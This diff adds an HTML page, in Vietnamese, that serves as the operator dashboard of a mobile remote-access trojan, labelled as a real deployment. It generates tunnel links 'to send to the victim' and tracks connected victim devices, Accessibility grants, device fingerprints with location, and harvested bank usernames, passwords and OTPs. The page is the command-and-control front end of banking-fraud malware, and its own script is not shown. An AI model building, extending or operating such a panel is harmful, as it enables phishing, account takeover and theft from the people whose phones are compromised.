@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rank 3 — Mobile RAT C2 Dashboard</title>
+    <link rel="stylesheet" href="dashboard-style.css">
+</head>
+<body>
+    <header class="topbar">
+        <div class="topbar-left">
+            <h1>📱 RANK 3 — MOBILE RAT C2</h1>
+            <span class="version">v2.0 Triển khai thật</span>
+        </div>
+        <div class="topbar-right">
+            <span class="ws-status" id="wsStatus">⏳ Connecting...</span>
+            <button class="btn-danger-sm" onclick="clearAllData()">🗑️ Xóa dữ liệu</button>
+        </div>
+    </header>
+
+    <!-- TUNNEL SECTION -->
+    <section class="tunnel-section" id="tunnelSection">
+        <div class="tunnel-status">
+            <span id="tunnelIcon">🌐</span>
+            <div>
+                <div class="tunnel-label" id="tunnelLabel">Cloudflare Tunnel</div>
+                <div class="tunnel-url" id="tunnelUrl">Đang khởi tạo...</div>
+            </div>
+        </div>
+        <div class="tunnel-links" id="tunnelLinks" style="display:none">
+            <div class="link-item">
+                <span>📱 Link gửi nạn nhân:</span>
+                <code id="linkLanding">—</code>
+                <button onclick="copyLink('linkLanding')">📋</button>
+            </div>
+            <div class="link-item">
+                <span>🎯 RAT App trực tiếp:</span>
+                <code id="linkRat">—</code>
+                <button onclick="copyLink('linkRat')">📋</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- STATS -->
+    <section class="stats-grid">
+        <div class="stat-card">
+            <div class="stat-value" id="statVictims">0</div>
+            <div class="stat-label">Thiết bị kết nối</div>
+        </div>
+        <div class="stat-card accent">
+            <div class="stat-value" id="statOnline">0</div>
+            <div class="stat-label">Đang online</div>
+        </div>
+        <div class="stat-card danger">
+            <div class="stat-value" id="statCreds">0</div>
+            <div class="stat-label">Credentials</div>
+        </div>
+        <div class="stat-card warning">
+            <div class="stat-value" id="statOtp">0</div>
+            <div class="stat-label">OTP thu hoạch</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="statAccess">0</div>
+            <div class="stat-label">Accessibility ✓</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="statFingerprints">0</div>
+            <div class="stat-label">Fingerprints</div>
+        </div>
+    </section>
+
+    <!-- MAIN CONTENT -->
+    <div class="main-grid">
+        <!-- LEFT: Victims List -->
+        <section class="panel">
+            <div class="panel-header">
+                <h2>📱 Thiết Bị Kết Nối</h2>
+                <button class="btn-sm" onclick="refreshVictims()">🔄</button>
+            </div>
+            <div class="panel-body" id="victimsList">
+                <div class="empty-state">Chưa có thiết bị nào kết nối. Gửi link landing page cho nạn nhân.</div>
+            </div>
+        </section>
+
+        <!-- RIGHT: Live Feed -->
+        <section class="panel">
+            <div class="panel-header">
+                <h2>🔴 Live Feed</h2>
+                <span class="live-dot"></span>
+            </div>
+            <div class="panel-body feed-scroll" id="liveFeed">
+                <div class="empty-state">Đang chờ dữ liệu realtime...</div>
+            </div>
+        </section>
+    </div>
+
+    <!-- CREDENTIALS TABLE -->
+    <section class="panel full-width">
+        <div class="panel-header">
+            <h2>🎣 Credentials Thu Hoạch</h2>
+        </div>
+        <div class="panel-body">
+            <table class="data-table" id="credsTable">
+                <thead>
+                    <tr>
+                        <th>Thời gian</th>
+                        <th>Victim</th>
+                        <th>Ngân hàng</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>OTP</th>
+                    </tr>
+                </thead>
+                <tbody id="credsBody">
+                    <tr><td colspan="6" class="empty-cell">Chưa có credentials</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- FINGERPRINTS -->
+    <section class="panel full-width">
+        <div class="panel-header">
+            <h2>📲 Fingerprints Thiết Bị</h2>
+        </div>
+        <div class="panel-body">
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Thời gian</th>
+                        <th>Thiết bị</th>
+                        <th>OS</th>
+                        <th>Trình duyệt</th>
+                        <th>Màn hình</th>
+                        <th>Vị trí</th>
+                    </tr>
+                </thead>
+                <tbody id="fpBody">
+                    <tr><td colspan="6" class="empty-cell">Chưa có fingerprint</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <script src="dashboard-script.js"></script>
+</body>
+</html>
